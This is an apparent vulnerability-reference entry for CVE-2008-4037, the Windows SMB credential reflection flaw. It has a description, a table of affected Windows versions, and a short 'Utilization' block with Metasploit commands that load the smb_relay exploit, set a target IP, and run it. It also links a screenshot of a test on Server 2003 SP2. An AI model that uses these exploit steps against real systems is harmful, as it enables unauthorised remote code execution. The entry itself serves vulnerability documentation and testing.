### CVE-2008-4037

#### Describe

Microsoft Windows 2000 Gold through SP4, XP Gold through SP3, Server 2003 SP1 and SP2, Vista Gold and SP1, and Server 2008 allows remote SMB servers to execute arbitrary code on a client machine by replaying the NTLM credentials of a client user, as demonstrated by backrush, aka "SMB Credential Reflection Vulnerability." NOTE: some reliable sources report that this vulnerability exists because of an insufficient fix for CVE-2000-0834.


#### ImpactVersion

| Product             | CPU Architecture | Version | Update | Tested             |
| ------------------- | ---------------- | ------- | ------ | ------------------ |
| Windows XP          |                  |         | SP2    |                    |
| Windows XP          |                  |         | SP3    |                    |
| Windows Server 2003 |                  |         | SP1    |                    |
| Windows Server 2003 |                  |         | SP2    | &#10004; |
| Windows 2000        |                  |         | SP4    |                    |
| Windows Server 2008 | X64/X86          |         |        |                    |
| Windows Vista       |                  |         | SP1    |                    |
| Windows Vista       |                  |         |        |                    |

#### Utilization

use MSF Test system Windows Server 2003 SP2 x86

```
use exploit/windows/smb/smb_relay
set SMBHOST 192.168.1.14 #目标IP
run
```

![image-20200823142846532](https://raw.github.com/Ascotbe/Image/master/Kernelhub/CVE-2008-4037_win2003_x86_msf.png)

